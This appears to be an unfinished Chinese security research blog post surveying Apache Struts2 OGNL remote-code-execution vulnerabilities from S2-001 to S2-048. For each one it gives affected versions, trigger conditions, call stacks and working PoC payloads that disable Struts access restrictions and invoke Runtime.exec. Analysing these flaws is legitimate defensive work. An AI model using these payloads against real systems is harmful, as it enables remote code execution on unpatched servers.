# Java RCE分析（一）

![Category](https://img.shields.io/badge/category-security_research-blue.svg)
![Research](https://img.shields.io/badge/research-web_security-blue.svg)
![Language](https://img.shields.io/badge/lang-java-blue.svg)
![Timestamp](https://img.shields.io/badge/timestamp-0000000000-lightgrey.svg)
![Progress](https://img.shields.io/badge/progress-5%25-red.svg)

<sub>* 本文是去年底就准备写的，结果后来忙忘了。前段时间的[S2-048](https://struts.apache.org/docs/s2-048.html)让Java RCE又一次出现在公众的视野，于是趁热打铁。另，笔者水平实在有限，有什么不恰当或不正确的观点言论，请不吝赐教。</sub>

介绍什么是Java什么是RCE的那些长篇大论我们就免了，又不是为了写本书凑字数，直接来看看Java中常见的可以导致RCE的场景：

- 可解析表达式
- 反序列化
- 反射
- 相关业务功能

## 可解析表达式

> 管中窥豹：千疮百孔的Struts2，与它最爱的OGNL表达式

Struts2历年来的RCE还算是挺『[丰富](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins)』的，不算黑，毕竟是曾经的经典，漏洞应该促使其概念革新技术进步，只让我们稍作整理 *（由于篇幅原因，关于漏洞描述和一些其他介绍性的信息本文就直接忽略了，有兴趣的可以超链接到官方查阅）* 。

### [S2-001](https://cwiki.apache.org/confluence/display/WW/S2-001)

触发条件

1. Struts 2.0.0 - 2.0.8 && XWork <= 2.0.3
1. 启用altSyntax *（默认）*
1. 受影响参数数据回显
n. TODO：确认是否必须为struts标签或实现validate方法即可

作用域

1. 上述条件限制的参数

底层G点

`TextParseUtil.translateVariables()`

    [ PoC样本 ]
        %{@java.lang.Runtime@getRuntime().exec('calc')}

    [ 关键调用栈 ]
        -> org.apache.struts2.components.UIBean.evaluateParams()
        -> org.apache.struts2.components.Component.findString()
        -> org.apache.struts2.components.Component.findValue()
        -> com.opensymphony.xwork2.util.TextParseUtil.translateVariables()
        -> com.opensymphony.xwork2.util.OgnlValueStack.findValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

特点

1. 用`%{}`包裹的参数值以普通字符串形式压入ValueStack，在`TransformControl.afterBody()`阶段执行`UIBean.evaluateParams()`流程时被再次以`%{}`包裹进行解析，由于低版本XWork2的OGNL递归解析到内层`%{}`，造成RCE

### [S2-003](https://cwiki.apache.org/confluence/display/WW/S2-003)

触发条件

1. Struts 2.0.0 - 2.0.11.2 && XWork <= 2.0.5

作用域

1. 任意action *（struts-default.xml -> ParametersInterceptor）*

底层G点

``

    [ PoC样本 ]


特点

1. 由于Struts2对`#`等特殊字符做了限制，因此使用了OGNL中`(one)(two)`之类的表达式求值模型绕过

### [S2-005](https://cwiki.apache.org/confluence/display/WW/S2-005) *（S2-003修复绕过）*

*（>> 已完成复现+跟踪调试）*

触发条件

1. Struts 2.0.0 - 2.1.8.1

作用域

1. *（struts-default.xml -> ParametersInterceptor）*

底层G点

`OgnlValueStack.setValue()`

    [ PoC样本 ]
        ?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(vaaa)=true
        &(aaaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023vccc')(\u0023vccc\u003dfalse))
        &(asdf)(('\u0023rt.exec(\'calc\')')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1

    [ 关键调用栈 ]
        -> org.apache.struts2.dispatcher.Dispatcher.serviceAction()
        -> org.apache.struts2.impl.StrutsActionProxy.execute()
        -> com.opensymphony.xwork2.DefaultActionInvocation.invoke()
        -> com.opensymphony.xwork2.interceptor.MethodFilterInterceptor.intercept()
        -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept()
        -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters()
        -> com.opensymphony.xwork2.ognl.OgnlValueStack.setValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.setValue()

表达式

- 最终解析：Raw
- 抽象模型：(1)(2)+(1)((2)(3))

特点

1. 控制`denyMethodExecution=false`和`allowStaticMethodAccess=true`绕过安全限制

### [S2-007](https://cwiki.apache.org/confluence/display/WW/S2-007)

触发条件

1. Struts 2.0.0 - 2.2.3

### [#S2-008](https://cwiki.apache.org/confluence/display/WW/S2-008)

触发条件

1. Struts 2.1.0 - 2.3.1
1. 启用DevMode

作用域

1. 任意action *（struts-default.xml -> DebuggingInterceptor）*

底层G点

`ValueStack.findValue()`

    [ PoC样本 ]
        ?debug=command
        &expression=(#context['xwork.MethodAccessor.denyMethodExecution']=false,#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('calc'))

    [ 关键调用栈 ]
        // TODO: 看看是什么时候进这个拦截器的
        -> org.apache.struts2.interceptor.debugging.DebuggingInterceptor.intercept()
        -> com.opensymphony.xwork2.util.OgnlValueStack.findValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

表达式

- 最终解析：Raw
- 抽象模型：(1,2)

### [S2-009](https://cwiki.apache.org/confluence/display/WW/S2-009) *（，S2-005 Fixed-Bypass）*

触发条件

1. Struts 2.0.0 - 2.3.1.1

作用域

1.

底层G点

``

    [ PoC样本 ]
        ?foo=(\u0023context['xwork.MethodAccessor.denyMethodExecution']=false,\u0023_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('calc'))(a)
        &z[(foo)(a)]=1

表达式

- 最终解析：
- 抽象模型：

S2-012
S2-013
S2-014

### [S2-015](https://cwiki.apache.org/confluence/display/WW/S2-015)

触发条件

1. Struts 2.0.0 - 2.3.14.2

作用域

### [S2-016](https://cwiki.apache.org/confluence/display/WW/S2-016)

触发条件

1. Struts 2.0.0 - 2.3.15

作用域

1. 任意action *（常规的`?redirect:`或`?redirectAction:`形式）*

底层G点

`TextParseUtil.translateVariables()`

    [ PoC样本 ]
        ${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#f=@java.lang.Runtime@getRuntime().exec('calc'),#f.close}

    [ 关键调用栈 ]
        // 设置method
        -> org.apache.struts2.dispatcher.mapper.DefaultActionMapper.getMapping()
        -> org.apache.struts2.dispatcher.mapper.DefaultActionMapper.handleSpecialParameters()
        -> org.apache.struts2.dispatcher.mapper.ParameterAction.execute()  // 在DefaultActionMapper构造函数中定义
        -> org.apache.struts2.dispatcher.mapper.ActionMapping.setResult()
        // 获取和调用method
        -> org.apache.struts2.dispatcher.Dispatcher.serviceAction()
        -> org.apache.struts2.dispatcher.StrutsResultSupport.execute()
        -> org.apache.struts2.dispatcher.StrutsResultSupport.conditionalParse()
        -> com.opensymphony.xwork2.util.TextParseUtil.translateVariables()
        -> com.opensymphony.xwork2.util.OgnlValueStack.findValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

### [S2-019](https://cwiki.apache.org/confluence/display/WW/S2-019)

触发条件

1. Struts 2.0.0 - 2.3.15.1

作用域

### [S2-027](https://cwiki.apache.org/confluence/display/WW/S2-027)

触发条件

1. Struts 2.0.0 - 2.3.16.3

### [S2-029](https://cwiki.apache.org/confluence/display/WW/S2-029)

触发条件

1. Struts 2.0.0 - 2.3.24.1 *（Struts 2.3.20.3除外）*
1. 部分受影响Struts标签 *（如`<s:i18n>`）* 的name或id属性值可控，且为OGNL表达式 *（如`%{name}`）*

作用域

1. 上述条件限制的参数

底层G点

`TextParseUtil.translateVariables()`

    [ PoC样本 ]
        '),#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#a=@java.lang.Runtime@getRuntime(),#a.exec('calc'),new java.lang.String('

    [ 关键调用栈 ]
        -> org.apache.struts2.components.I18n.start()
        // 第一次解析
        -> org.apache.struts2.components.Component.findString()
        -> org.apache.struts2.components.Component.findValue()
        -> com.opensymphony.xwork2.util.TextParseUtil.translateVariables()
        -> com.opensymphony.xwork2.util.OgnlValueStack.findValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()
        // 第二次解析
        -> org.apache.struts2.components.Component.findValue()
        -> com.opensymphony.xwork2.util.TextParseUtil.translateVariables()
        -> com.opensymphony.xwork2.util.OgnlValueStack.findValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

特点

1. 逻辑上的二次解析，与S2-001中的递归解析不同概念

### [S2-032](https://cwiki.apache.org/confluence/display/WW/S2-032)

触发条件

1. Struts 2.3.20 - 2.3.28 *（Struts 2.3.20.3和2.3.24.3除外）*
1. 启用DynamicMethodInvocation *（动态方法调用）*

作用域

1. 任意action method *（改写`!`为`?method:`形式）*

底层G点

`OgnlUtil.getValue()`

    [ PoC样本 ]
        #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#f=@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]),#f.close  // cmd为额外请求参数，绕过"和'等特殊符号限制，如cmd=calc

    [ 关键调用栈 ]
        // 设置method
        -> org.apache.struts2.dispatcher.mapper.DefaultActionMapper.getMapping()
        -> org.apache.struts2.dispatcher.mapper.DefaultActionMapper.handleSpecialParameters()
        -> org.apache.struts2.dispatcher.mapper.ParameterAction.execute()  // 在DefaultActionMapper构造函数中定义
        -> org.apache.struts2.dispatcher.mapper.ActionMapping.setMethod()
        // 获取和调用method
        -> org.apache.struts2.rest.RestActionInvocation.invoke()
        -> com.opensymphony.xwork2.DefaultActionInvocation.invokeAction()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

特点

1. 使用`?method:`形式绕过`!`形式的特殊字符限制
1. 使用额外请求参数绕过`StringEscapeUtils.escapeEcmaScript()`和`StringEscapeUtils.escapeHtml4()`的特殊字符限制

### [S2-033](https://cwiki.apache.org/confluence/display/WW/S2-033) *（S2-032同源）*

触发条件

1. Struts 2.3.20 - 2.3.28 *（Struts 2.3.20.3和2.3.24.3除外）*
1. 启用DynamicMethodInvocation *（动态方法调用）*
1. 使用struts2-rest-plugin

作用域

1. 满足路由条件的action method *（常规的`!`形式）*

底层G点

`OgnlUtil.getValue()`

    [ PoC样本 ]
        #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]),#xx=123,#xx.toString.json?  // cmd为额外请求参数

    [ 关键调用栈 ]
        // 设置method
        -> org.apache.struts2.rest.RestActionMapper.getMapping()
        -> org.apache.struts2.rest.RestActionMapper.handleDynamicMethodInvocation()
        -> org.apache.struts2.dispatcher.mapper.ActionMapping.setMethod()
        // 获取和调用method
        -> org.apache.struts2.rest.RestActionInvocation.invoke()
        -> com.opensymphony.xwork2.DefaultActionInvocation.invokeAction()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

### [S2-036](https://cwiki.apache.org/confluence/display/WW/S2-036) *（S2-029 Bypass）*

触发条件

1. Struts 2.0.0 - 2.3.28.1

### [S2-037](https://cwiki.apache.org/confluence/display/WW/S2-037) *（S2-032同源）*

触发条件

1. Struts 2.3.20 - 2.3.28.1
1. 使用struts2-rest-plugin

作用域

1. 满足路由条件的action method *（正常的Restful请求，无视DynamicMethodInvocation）*

底层G点

`OgnlUtil.getValue()`

    [ PoC样本 ]
        #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]),#xx=123,#xx.toString.json?  // cmd为额外请求参数

    [ 关键调用栈 ]
        // 设置method
        -> org.apache.struts2.rest.RestActionMapper.getMapping()
        -> org.apache.struts2.dispatcher.mapper.ActionMapping.setMethod()
        // 获取和调用method
        -> org.apache.struts2.rest.RestActionInvocation.invoke()
        -> com.opensymphony.xwork2.DefaultActionInvocation.invokeAction()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

特点

1. 不需要启用DynamicMethodInvocation *（相对于S2-033的另一个处理分支流程）*

### [S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)

触发条件

1. Struts 2.3.5 - 2.3.31, Struts 2.5 - 2.5.10

作用域

1. 任意action *（全局Dispatcher，优先于Interceptors链）*

底层G点

`LocalizedTextUtil.findText()`

    [ PoC样本 ]
        %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@java.lang.Runtime@getRuntime().exec('calc'))}

    [ 关键调用栈 ]
        -> org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parse()
        -> org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.buildErrorMessage()
        -> com.opensymphony.xwork2.util.LocalizedTextUtil.findText()
        -> com.opensymphony.xwork2.util.OgnlValueStack.findValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

特点

1. 漏洞触发在Struts2本身的Dispatcher层，还处于封装Request的逻辑中，连Interceptor层都还没进

### [S2-046](https://cwiki.apache.org/confluence/display/WW/S2-046) *（S2-045同源）*

触发条件

1. Struts 2.3.5 - 2.3.31, Struts 2.5 - 2.5.10

作用域

1. 任意action *（全局Dispatcher，优先于Interceptors链）*

底层G点

`LocalizedTextUtil.findText()`

    [ PoC样本 ]
        %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@java.lang.Runtime@getRuntime().exec('calc'))}

    [ 关键调用栈 ]
        -> org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parse()
        -> org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.buildErrorMessage()
        -> com.opensymphony.xwork2.util.LocalizedTextUtil.findText()
        -> com.opensymphony.xwork2.util.OgnlValueStack.findValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

### [S2-048](https://cwiki.apache.org/confluence/display/WW/S2-048)

触发条件

1. Struts 2.3.x
1. 使用struts2-struts1-plugin
1. 被Struts1Action包装的action中将用户可控参数以key值设置到ActionMessage中，且信息数据回显

作用域

1. 上述条件限制的参数

底层G点

`ActionSupport.getText()`

    [ PoC样本 ]
        %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@java.lang.Runtime@getRuntime().exec('calc'))}

    [ 关键调用栈 ]
        -> org.apache.struts2.s1.Struts1Action.execute()
        -> com.opensymphony.xwork2.ActionSupport.getText()
        -> com.opensymphony.xwork2.TextProviderSupport.getText()
        -> com.opensymphony.xwork2.util.LocalizedTextUtil.findText()
        -> com.opensymphony.xwork2.util.OgnlValueStack.findValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.getValue()

特点

- 黑盒特征不明显，唯一确认的是ActionMessage/ActionError/FieldError对象一般用于后端向前端传递消息，前端可获取并显示，即很大几率存在数据回显，可用`%{1+1}`类Payload测试 *（前端`<s:actionmessage>`仅被解析为无特征`<ul><li><span>`组合，不太适合作为判断依据）*

### Struts2安全策略及其绕过方式

### 分析

根据上述总结的Struts2的历史RCE数据，先做个简单的统计：

- 底层G点频率

...

- 表达式 *（抽象模型）* 频率

...

可以发现几个共性：

1. 几乎所有OGNL相关漏洞跟踪到底层，都是走到`OgnlUtil.getValue()`或`OgnlUtil.setValue()`中，解析OGNL表达式 *（至少在Struts2，或其他基于XWork2的框架中）*
1. 可能出现安全问题的解析方式
    - 直接解析 *（含OGNL表达式求值）*
    - 二次解析 *（逻辑多次或递归）*

根据上述共性，以及对OGNL源码的深度分析，可以得出关于OGNL的特性：

1. `OgnlUtil.setValue()`和`OgnlUtil.getValue()`都会先对表达式进行编译解析 *（`OgnlUtil.compile()`）*

由此，我们开始向上进行逆向『挖掘』工作，抽象关系树：

`OgnlUtil.getValue()` ->

## 不是最后的最后

除了OGNL，还有EL，以及Spring等其他框架使用的表达式语言，本文暂时先总结了Struts2的OGNL，等以后分析到了其他合适的案例再更新进来。

*（由于时间关系，有些漏洞在跟踪分析的时候不是特别细致，有兴趣的可以自己跟踪调试，发现与本文有出入的地方，请与作者联系修正）*

## 参考

1. [Struts2 Security Bulletins](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins)
